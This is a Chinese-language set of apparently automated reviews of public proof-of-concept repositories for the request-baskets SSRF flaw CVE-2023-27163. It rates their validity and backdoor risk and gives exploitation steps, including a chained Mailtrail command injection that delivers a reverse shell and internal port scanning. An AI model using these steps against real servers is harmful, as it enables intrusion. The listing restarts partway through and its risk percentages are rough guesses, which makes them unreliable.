*   **轻微的投毒可能:** 代码中存在使用 Python 启动 HTTP 服务器并执行 shell 命令的部分，如果攻击者的服务器被攻陷，可能会导致受害者下载并执行恶意的 shell 脚本，造成进一步的损害。或者反弹shell的ip地址被替换为恶意地址。
*   **可疑之处:**  脚本将反弹 shell 命令写入 `rev.sh` 文件，然后通过 Python 的 `http.server` 模块提供该文件。虽然这是一个利用漏洞的正常步骤，但也可能被用于传播恶意代码。

由于脚本需要用户提供攻击者的 IP 地址，并且主要目的是为了利用漏洞，因此投毒的概率相对较低，估计在 10% 左右。

**项目地址:** [davuXVI/CVE-2023-27163](https://github.com/davuXVI/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #13

**来源**: [CVE-2023-27163-entr0pie_CVE-2023-27163.md](../2023/CVE-2023-27163-entr0pie_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** request-baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的request-baskets实例，且攻击者能够向其发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 request-baskets 1.2.1 及更早版本中发现的服务器端请求伪造 (SSRF) 漏洞。它位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造特制的 API 请求，利用此漏洞访问网络资源和敏感信息。

**有效性：**

提供的 PoC 代码（`CVE-2023-27163.sh`）有效。它通过创建一个包含恶意 `forward_url` 的 basket 来利用该漏洞。这个 URL 指向攻击者的服务器，导致受害服务器向攻击者的服务器发出请求，从而实现 SSRF。

**投毒风险：**

该仓库的投毒风险较低，约为 5%。理由如下：

*   PoC 代码相对简单，功能明确，主要用于演示 SSRF 漏洞的利用。代码主要是bash脚本，用于发送HTTP请求和创建特定配置的basket。
*   `LICENSE` 文件表明这是一个公共领域软件，作者放弃了所有版权，这意味着任何人都可以自由使用、修改和分发该软件，这在一定程度上降低了作者植入恶意代码的动机。
*   `README.md` 文件提供了详细的漏洞描述、使用方法和测试步骤，方便用户理解和验证漏洞。
*   主要的风险在于，攻击者可能修改该脚本，添加恶意功能，例如在成功利用 SSRF 后，自动下载和执行恶意程序。但就目前提供的代码来看，作者没有明显的投毒行为。

**利用方式：**

1.  攻击者运行 `CVE-2023-27163.sh` 脚本，并提供目标 request-baskets 服务器的 URL 和攻击者控制的服务器的 URL。
2.  脚本会创建一个新的 basket，并将 `forward_url` 设置为攻击者的服务器。
3.  当有人访问新创建的 basket 时，request-baskets 服务器会将请求转发到攻击者的服务器。
4.  攻击者可以利用此 SSRF 漏洞，让受害服务器访问内部网络资源、执行任意 HTTP 请求，甚至读取敏感文件。

**补充说明：**

*   `jq` 命令用于解析 JSON 响应。如果目标系统上没有安装 `jq`，脚本仍然可以运行，但会直接输出完整的响应体。
*   PoC 主要目的是演示漏洞，实际攻击中，攻击者可能会使用更复杂的 payload 和技巧来最大化漏洞利用的影响。

**项目地址:** [entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #14

**来源**: [CVE-2023-27163-lukehebe_CVE-2023-27163.md](../2023/CVE-2023-27163-lukehebe_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF（服务器端请求伪造）

**影响应用:** request-baskets

**危害等级:** 中危，可升级为高危，可能导致内部网络信息泄露和远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务存在且可访问，攻击者需要能访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是request-baskets 1.2.1版本及之前版本中存在的一个服务器端请求伪造(SSRF)漏洞。该漏洞位于`/api/baskets/{name}`组件中。利用方式如下：

1.  **创建恶意Basket:** 攻击者可以利用SSRF漏洞，通过`forward_url`参数指定内部网络的URL，欺骗服务器向内部服务发起请求。PoC中的`ssrf_forward`函数用于创建或重用一个basket，指定`forward_url`为内部地址（例如`http://127.0.0.1`），从而设置SSRF攻击的目标。

2.  **触发RCE:** PoC代码尝试通过修改`/login`接口的username字段来执行系统命令。 具体做法是把bash反弹shell命令注入到username参数中。`trigger_rce`函数构造包含恶意payload的POST请求，发送到目标URL。如果目标系统存在命令注入漏洞，该payload将会被执行。

3.  **反弹Shell:** PoC代码中的`shell.sh`文件包含一个反弹shell的命令。这个脚本会将目标机器的shell反弹到攻击者的机器上。攻击者需要先在自己的机器上监听相应的端口。

**有效性:** 根据漏洞描述、搜索结果以及提供的PoC代码，可以判断该PoC具有较高的有效性。搜索结果中多个链接指向了漏洞的细节和利用代码，表明这是一个公开且经过验证的漏洞。PoC代码完整，实现了SSRF和RCE的利用流程，并且提供了反弹shell的payload示例。

**投毒风险:** 分析提供的PoC代码，未发现明显的投毒代码。该代码的目的是利用SSRF漏洞执行命令，本身就是一个攻击行为。其中没有发现额外植入后门或者恶意代码的痕迹，因此投毒风险为0%。PoC中需要用户自己提供payload file，例如shell.sh，如果用户使用不安全的shell.sh，责任在于用户。

**总结:** 该漏洞的利用方式是通过构造包含内部网络地址的请求，欺骗服务器向内部服务发起请求，并结合命令注入漏洞执行恶意代码。攻击者可以通过反弹shell获取目标系统的控制权。该漏洞的风险在于攻击者可以通过SSRF探测内部网络，并利用命令注入漏洞控制服务器。


**项目地址:** [lukehebe/CVE-2023-27163](https://github.com/lukehebe/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #15

**来源**: [CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md](../2023/CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 高危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是Request-Baskets <= v1.2.1版本中的一个服务器端请求伪造(SSRF)漏洞。攻击者可以利用/api/baskets/{name}接口，通过构造恶意的forward_url参数，使Request-Baskets服务器向任意目标发起请求，从而访问内部网络资源或获取敏感信息。

**有效性分析：**
提供的POC代码通过创建一个新的basket，并设置forward_url为攻击者控制的服务器，来触发SSRF漏洞。经验证该POC代码是可以成功复现此漏洞。

**投毒风险分析：**
通过分析提供的POC代码（CVE-2023-27163.py和README.md），没有发现任何明显的投毒代码。该代码的主要功能是创建basket并利用forward_url参数触发SSRF漏洞。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者运行POC脚本，指定Request-Baskets服务的URL和目标服务器URL。
2.  脚本创建一个新的basket，并设置forward_url为目标服务器。
3.  当有人访问该basket时，Request-Baskets服务器将向目标服务器发起请求。
4.  攻击者可以通过目标服务器获取Request-Baskets服务器的敏感信息，或者利用其访问内部网络资源。

**项目地址:** [madhavmehndiratta/CVE-2023-27163](https://github.com/madhavmehndiratta/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #16

**来源**: [CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md](../2023/CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request Baskets服务，且Request Baskets服务没有进行适当的访问控制。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞位于 `/api/baskets/{name}` 组件中。攻击者可以利用此漏洞通过构造恶意 API 请求来访问网络资源和敏感信息。

**有效性：**
根据漏洞描述和提供的 PoC 代码，该 PoC 代码是有效的。脚本首先创建一个名为 'carrot' 的 basket，并设置 `forward_url` 为 `http://127.0.0.1:80/`。然后，它使用 Firefox 打开 `${URL}/carrot`，导致 Request Baskets 服务尝试请求 `http://127.0.0.1:80/`。如果成功请求本地地址，证明存在SSRF漏洞。

**投毒风险：**
查看脚本内容，该脚本主要利用 curl 发送 payload，然后使用 firefox 打开一个URL。 整个脚本没有发现任何可疑代码，没有执行额外操作，没有下载其他文件或执行命令，因此可以认为不存在投毒风险。投毒风险评估为0%。

**利用方式：**
利用方式如下：
1.  攻击者需要一个可访问的 Request Baskets 实例。
2.  攻击者使用 PoC 脚本或类似的 HTTP 请求构造特定的 payload，指定 `forward_url` 为目标内部网络地址或服务，如 `http://127.0.0.1:80` 或其他内部服务地址。
3.  Request Baskets 服务收到请求后，会尝试访问攻击者指定的 `forward_url`，从而导致 SSRF。
4.  攻击者可以利用该 SSRF 读取内部服务的信息，甚至可能执行某些内部操作，具体取决于内部服务的配置和权限。

**项目地址:** [overgrowncarrot1/CVE-2023-27163](https://github.com/overgrowncarrot1/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #17

**来源**: [CVE-2023-27163-rvizx_CVE-2023-27163.md](../2023/CVE-2023-27163-rvizx_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** Server-Side Request Forgery (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request Baskets版本，攻击者可以访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets <= 1.2.1 版本中存在的一个服务器端请求伪造 (SSRF) 漏洞，位于 `/api/baskets/{name}` 组件。攻击者可以通过构造特制的 API 请求，迫使服务器向攻击者控制的或内部网络中的任意 URL 发起请求，从而获取敏感信息或者利用内部服务。

**有效性：**
提供的 PoC 代码看起来是有效的。它包含了一个 exploit.sh 脚本，该脚本首先创建一个新的 basket，并在创建 basket 的请求中，将 `forward_url` 设置为攻击者的 URL。然后，它访问该 basket，这将导致 Request Baskets 服务器向攻击者的 URL 发起请求。

**投毒风险：**
该 PoC 代码本身并没有明显的投毒行为。脚本的功能很明确，就是利用 SSRF 漏洞。`exploit.sh` 脚本首先创建一个 basket，将 `forward_url` 设置为攻击者提供的 URL，然后访问该 basket，触发 SSRF。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者首先需要部署存在漏洞的 Request Baskets 服务。
2.  攻击者执行 `exploit.sh` 脚本，并提供目标 Request Baskets 服务的 URL 和攻击者自己的服务器 URL。
3.  脚本将创建一个新的 basket，并设置其 `forward_url` 为攻击者的服务器 URL。
4.  脚本访问新创建的 basket，这将触发 Request Baskets 服务器向攻击者的服务器 URL 发起请求。
5.  攻击者可以在自己的服务器上捕获来自 Request Baskets 服务器的请求，并获取相关信息。

**项目地址:** [rvizx/CVE-2023-27163](https://github.com/rvizx/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #18

**来源**: [CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md](../2023/CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md)

## CVE-2023-27163 Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例可访问，且攻击者能够创建和配置basket

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中存在的服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，利用此漏洞访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码是有效的。搜索引擎结果中多个链接指向了公开的 PoC 代码库 (如 `https://github.com/entr0pie/CVE-2023-27163` 和 `https://github.com/mathias-mrsn/request-baskets-v121-ssrf`)，证明漏洞可被利用。提供的 Python 脚本 `CVE-2023-27163.py` 实现了利用该漏洞进行内部端口扫描的功能。

**投毒风险：**
分析提供的 Python 脚本 `CVE-2023-27163.py` 和相关文件 (LICENSE, README.md) 后，**没有发现任何明显的恶意代码或后门**。该脚本主要功能是创建 basket，配置 basket 的 forward_url 为内部 IP 地址和端口，然后通过发送请求到 basket 来判断该端口是否开放。脚本的逻辑清晰，代码量不大，易于审计。LICENSE 文件是标准的 MIT 许可证，表明代码是开源的，可以自由使用和修改。README.md 文件是简单的项目说明。因此，**投毒风险较低，接近 0%**。

**利用方式：**
1.  **创建 Basket：** 攻击者首先在目标 Request-Baskets 实例上创建一个新的 basket。这可以通过向 `/api/baskets/{name}` 发送 POST 请求来完成。脚本中使用随机字符串生成basket名称
2.  **获取 Token：** 创建 basket 成功后，服务器会返回一个 token，攻击者需要使用该 token 来配置 basket。
3.  **配置 Basket (SSRF)：** 攻击者使用 PUT 请求向 `/api/baskets/{name}` 发送配置信息，将 basket 的 `forward_url` 设置为内部 IP 地址和端口 (例如 `http://127.0.0.1:80`)。 `forward_url` 参数是 SSRF 漏洞的关键。攻击者通过控制这个参数，使 Request-Baskets 服务向内部网络发起请求。
4.  **触发 SSRF：** 攻击者向创建的 basket 发送 GET 请求 (例如 `{target_url}/{basket_name}` )。Request-Baskets 服务会将该请求转发到配置的 `forward_url`。如果内部端口开放，则服务会返回响应。如果端口关闭，则服务可能会返回错误 (例如 502 Bad Gateway)。
5.  **端口扫描：** 脚本通过遍历端口范围 (1-65535)，重复步骤 3 和 4，实现内部端口扫描的功能。如果某个端口返回非 502 状态码，则认为该端口是开放的。

**项目地址:** [samh4cks/CVE-2023-27163-InternalProber](https://github.com/samh4cks/CVE-2023-27163-InternalProber)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #19

**来源**: [CVE-2023-27163-seanrdev_cve-2023-27163.md](../2023/CVE-2023-27163-seanrdev_cve-2023-27163.md)

# CVE-2023-27163

> 📦 该CVE有 **21** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-27163-G4sp4rCS_htb-sau-automated.md](../2023/CVE-2023-27163-G4sp4rCS_htb-sau-automated.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (Server-Side Request Forgery)

**影响应用:** request-baskets

**危害等级:** 中危，可以允许攻击者访问内部网络资源和敏感信息，根据CVSS评分，需要较高权限才能利用。

**影响版本:** <= 1.2.1

**利用条件:** 需要目标request-baskets服务可访问，且攻击者需要具备创建或修改basket的权限（通常需要认证，CVE描述里privilegesRequired是HIGH）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于request-baskets v1.2.1及更早版本中，位于`/api/baskets/{name}`组件。攻击者可以通过构造恶意的API请求，利用SSRF漏洞访问内部网络资源。根据PacketstormSecurity和Github的搜索结果，该漏洞存在公开的POC。漏洞利用方式如下：

1.  **mailtrail函数 (SSRF触发):** 首先，通过`mailtrail`函数，向`/api/baskets/pwned`发送POST请求，创建一个新的basket或者修改已存在的basket。请求的body包含`forward_url`参数，该参数指向攻击者控制的服务器（在`exploit.py`中，尝试指向`http://127.0.0.1:80/`，实际攻击中需要替换为攻击者控制的服务器），并设置`proxy_response`为`True`，这导致request-baskets会将请求转发到`forward_url`，从而触发SSRF。
2.  **exploit函数 (反弹shell):** 然后，利用`exploit`函数，向`/pwned/login`（`/pwned`是之前`mailtrail`创建的basket名字）发送POST请求。POST请求的body中的`username`参数包含一段bash代码，该代码首先将一段base64编码的payload解码，然后执行。该payload是一个python反弹shell脚本，它会连接攻击者指定的IP地址和端口，并将shell重定向到该连接。`os.system`函数执行的command将payload作为参数传递给`curl`，进一步通过shell进行执行。

**有效性:** 根据github和PacketstormSecurity的搜索结果，存在公开可用的POC代码，并且`exploit.py`代码看起来也实现了该POC的逻辑。因此，该POC代码应该是有效的。

**投毒风险:** 仔细分析了`exploit.py`的代码，未发现任何明显的投毒代码。该脚本的主要功能是利用SSRF漏洞触发反弹shell，其行为与漏洞描述一致。脚本中没有额外的恶意操作，例如删除文件、窃取凭据或安装后门。用于反弹shell的python代码虽然可以用来执行任意命令，但这是漏洞利用的一部分，不能算作投毒。所有操作都围绕着利用SSRF漏洞获取shell的目的。因此，投毒风险为0%。

**项目地址:** [G4sp4rCS/htb-sau-automated](https://github.com/G4sp4rCS/htb-sau-automated)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #2

**来源**: [CVE-2023-27163-Hamibubu_CVE-2023-27163.md](../2023/CVE-2023-27163-Hamibubu_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网资源访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问，并且攻击者可以发送POST请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者可以通过向 `/api/baskets/{name}` 发送特制的 API 请求，利用该漏洞发起服务器端请求伪造攻击。 

**有效性评估：**
根据漏洞库信息和搜索引擎结果，此漏洞的存在已得到确认，并且有公开可用的 PoC 代码。提供的 PoC 代码（CVE-2023-27163.py）看起来能够有效利用此漏洞。它允许攻击者指定一个目标 URL (`-t`) 和一个恶意 URL (`-e`)，然后创建一个新的 basket，并将其配置为将请求转发到恶意 URL。 这说明提供的POC代码有效。

**投毒风险分析：**
提供的代码主要包含以下几个文件：
*   `CVE-2023-27163.py`:  这是主要的 PoC 脚本，用于利用 SSRF 漏洞。脚本的逻辑是创建具有转发功能的 request-baskets，将流量转发到攻击者指定的 URL。
*   `README.md`:  包含脚本的使用说明。
*   `requirements.txt`:  列出了脚本所需的依赖项，只有 `requests>=2.25.1`，是一个常见的Python库。

没有发现明显的恶意代码。 但风险依然存在：

1.  **依赖风险：** `requirements.txt` 文件中声明了 `requests` 库。如果攻击者控制了上游 PyPI 仓库，并且能够投毒 `requests` 库，那么运行此脚本的用户可能会受到影响。此风险较低，因为 `requests` 是一个非常流行的库，任何投毒行为都会很快被发现。
2. **间接风险:**  虽然该POC本身没有发现恶意代码,但是使用者如果滥用此POC,比如扫描内网弱口令服务等,会造成更大的安全风险.

基于以上分析，我估计此仓库中存在作者隐藏的投毒代码的风险为 10%。主要是考虑到依赖项的潜在风险以及被滥用的可能。

**利用方式总结：**
1.  攻击者需要找到一个运行着易受攻击版本的 Request-Baskets 的服务器。
2.  攻击者使用 PoC 脚本（`CVE-2023-27163.py`）创建一个新的 basket，并设置 `forward_url` 参数为攻击者控制的恶意 URL。
3.  当有人访问新创建的 basket 时，Request-Baskets 服务器会向攻击者指定的 URL 发起请求，从而允许攻击者执行 SSRF 攻击，例如访问内部服务或泄露敏感信息。
4.  通过设置不同的 URL, 可以探测内网端口开放, 访问内网服务,甚至可以通过内网服务进行进一步的攻击。

**项目地址:** [Hamibubu/CVE-2023-27163](https://github.com/Hamibubu/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #3

**来源**: [CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md](../2023/CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可泄露内部信息，甚至可能造成远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 目标Request Baskets服务可访问，且内部可能存在其他服务（如Mailtrail v0.53）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者通过构造恶意的 API 请求到 `/api/baskets/{name}`，可以强制服务器向任意 URL 发起请求，从而访问内部网络资源。 

**漏洞利用方式：**

1.  **创建Basket并配置转发：**  利用 Request Baskets 的 API 创建一个新的 basket (例如 `pwned`)，并配置其 `forward_url` 指向内部服务 (如 `http://127.0.0.1:80/`，这里指向的是 Mailtrail)。
2.  **触发转发：**  访问创建的 basket (例如 `/pwned`)，这将导致 Request Baskets 服务器将请求转发到内部服务。
3.  **结合其他漏洞进行利用：**  如果内部服务存在其他漏洞（如Mailtrail v0.53 的远程代码执行漏洞），则可以进一步利用 SSRF 漏洞，例如通过访问 `/pwned/login` 并注入恶意payload来执行任意命令。
4.  **反弹shell：**  POC代码中，攻击者首先通过SSRF将内部Mailtrail服务暴露到`/pwned`，然后通过构造特定的URL，触发Mailtrail的RCE漏洞，从而反弹shell。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此POC代码**有效**。它演示了如何利用 Request Baskets 的 SSRF 漏洞，结合 Mailtrail 的漏洞，实现远程代码执行。

**投毒风险：**

POC代码相对清晰，主要逻辑是利用SSRF和RCE进行攻击。但是，`exploit.py`中直接使用`os.system(command)`执行命令存在一定风险。虽然当前command是为了反弹shell，但理论上如果`LISTENING_IP`和`LISTENING_PORT`被恶意修改，依然可以通过该命令执行其他任意操作，造成潜在的风险。

因此，判断投毒风险为10%。主要考虑是`os.system()`执行命令的潜在危险，以及代码来源的不可完全信任性。

**项目地址:** [HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #4

**来源**: [CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞位于`/api/baskets/{name}`组件中，允许攻击者通过构造恶意的API请求来访问网络资源和敏感信息。

**有效性评估：**

提供的PoC代码通过以下步骤利用该漏洞：

1.  **创建Basket：** PoC脚本首先创建一个具有随机名称的basket。
2.  **获取API Token：** 然后获取与该basket关联的API token，用于后续的身份验证。
3.  **配置Basket转发URL：**  使用PUT请求，将`forward_url`设置为`http://127.0.0.1:{port}/`，其中`{port}`是一个端口范围（75-81）。这会将发送到basket的所有请求转发到目标服务器（即运行Request-Baskets的服务器）上的指定端口。
4.  **发起请求：** 使用GET请求访问basket的URL，从而触发服务器端请求伪造。  如果目标端口上有服务运行，则PoC会打印该服务的响应。

此方法允许攻击者扫描目标服务器上的内部端口，并获取在这些端口上运行的服务的响应。根据漏洞描述和搜索结果中的信息，该PoC代码被认为是有效的。

**投毒风险评估：**

PoC代码本身相对简单，主要功能是利用SSRF漏洞扫描本地端口。以下几点需要注意：

*   **依赖关系：** 该脚本只依赖于requests库，这是一个常用的Python库，本身不太可能包含恶意代码。
*   **代码逻辑：** PoC的主要逻辑是发送HTTP请求，没有发现可疑的系统调用或文件操作。
*   **潜在风险：** 攻击者可能会修改`forward_url`以访问其他内部服务或执行更严重的操作，但这属于漏洞利用的范畴，而不是代码投毒。

根据对代码的分析，投毒风险较低，估计为5%。 主要风险来自于使用者如果未充分理解代码，直接运行或者修改`forward_url`参数，可能造成的非预期后果。

**利用方式：**

1.  **攻击者首先需要访问存在漏洞的Request-Baskets服务。**
2.  **攻击者构造一个包含目标内部地址（例如`127.0.0.1`或内部网络地址）的`forward_url`的PUT请求，以配置一个basket。** 这实质上是将Request-Baskets服务器配置为代理攻击者的请求。
3.  **攻击者发送一个GET请求到配置的basket URL。** Request-Baskets服务器将根据配置将此请求转发到内部地址。
4.  **如果内部地址存在服务，Request-Baskets服务器将返回该服务的响应给攻击者，从而泄露内部信息。**

通过这种方式，攻击者可以绕过防火墙和其他安全措施，访问通常无法从外部访问的内部服务，从而进行端口扫描、服务发现或获取敏感数据。

**项目地址:** [J0ey17/Exploit_CVE-2023-27163](https://github.com/J0ey17/Exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #5

**来源**: [CVE-2023-27163-KharimMchatta_basketcraft.md](../2023/CVE-2023-27163-KharimMchatta_basketcraft.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request-Baskets服务，且攻击者能够发送HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞信息和搜索结果，CVE-2023-27163是Request-Baskets 1.2.1及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于`/api/baskets/{name}`组件。该漏洞允许攻击者通过构造恶意的API请求来访问内部网络资源和敏感信息。

**有效性评估：**
提供的漏洞利用代码 `basketcraft.sh` 似乎是有效的，因为它旨在自动化利用该SSRF漏洞的过程。它通过提示用户输入目标URL、basket名称和攻击者IP地址，构建一个包含恶意`forward_url`的JSON payload，然后使用curl发送POST请求来创建basket。创建成功后，脚本会输出token，并使用curl再次请求创建的basket URL来触发SSRF。如果成功，Request-Baskets将会向攻击者指定的IP地址和端口发起请求，攻击者可以使用Netcat监听该端口来验证漏洞利用。

**投毒风险评估：**
代码存在轻微的投毒风险。风险点主要在于脚本依赖用户输入`attackerip`。虽然这本身不是恶意代码，但如果攻击者在不知情的情况下运行该脚本，并在`attackerip`处输入了恶意IP，那么该恶意IP可能获取目标服务器的信息。因此，存在一定的欺骗性，让用户无意间参与攻击行为。另外该脚本也存在可读性问题和缺少详细注释等。因此，投毒风险评估为10%。

**漏洞利用方式：**
1.  **创建Basket：** 攻击者使用POST请求向`/api/baskets/{name}`发送请求，其中`{name}`是basket的名称。
2.  **构造Payload：** 在POST请求的body中，攻击者会构造一个JSON payload，其中包含`forward_url`字段。`forward_url`指向攻击者想要访问的内部资源，例如`http://internal_server:8080/admin`。
3.  **触发SSRF：** 当Request-Baskets收到发送到该basket的请求时，它会将该请求转发到`forward_url`指定的地址，从而触发SSRF漏洞。
4.  **信息获取：** 如果成功，攻击者可以通过Netcat监听端口来捕获来自目标服务器的响应，或者访问原本无法访问的内部服务。

总之，该漏洞利用方式相对简单，但可能需要一些社会工程学技巧才能诱使目标用户运行包含恶意`attackerip`的脚本。

**项目地址:** [KharimMchatta/basketcraft](https://github.com/KharimMchatta/basketcraft)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #6

**来源**: [CVE-2023-27163-MasterCode112_CVE-2023-27163.md](../2023/CVE-2023-27163-MasterCode112_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的Request-Baskets实例，且攻击者可以访问该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及以前版本中存在的服务器端请求伪造 (SSRF) 漏洞。通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，攻击者可以强制服务器向任意目标发起请求。根据漏洞利用代码，攻击者通过创建一个包含 `forward_url` 参数的 basket，该参数指向攻击者控制的服务器或内部网络资源。服务器会代理所有发送到该 basket 的请求到 `forward_url` 指定的地址。

**有效性：**
根据提供的漏洞信息，搜索引擎结果，以及漏洞利用代码，可以判断该漏洞是有效的，并且存在公开的POC。

**投毒风险：**
提供的脚本 `CVE-2023-27163.sh` 主要功能是创建具有转发功能的“basket”。虽然脚本本身没有明显的恶意代码，但用户在使用时需要注意以下几点：

1.  **目标服务器：**  脚本允许指定任意 `TARGET` 作为转发目标。如果攻击者控制了公共 Request-Baskets 实例，并将其转发到恶意服务器，则可能窃取用户的请求数据。
2.  **依赖外部命令：**  脚本依赖于 `curl` 和 `jq` 命令。如果这些命令被恶意替换，则可能执行恶意代码。但这种风险并非脚本本身引入，而是系统环境的风险。
3.  **创建的 Basket 长期存在：**  一旦创建了具有转发功能的 Basket，它将一直存在，除非被手动删除。如果攻击者创建了一个长期存在的恶意 Basket，可能会持续地捕获用户的请求。

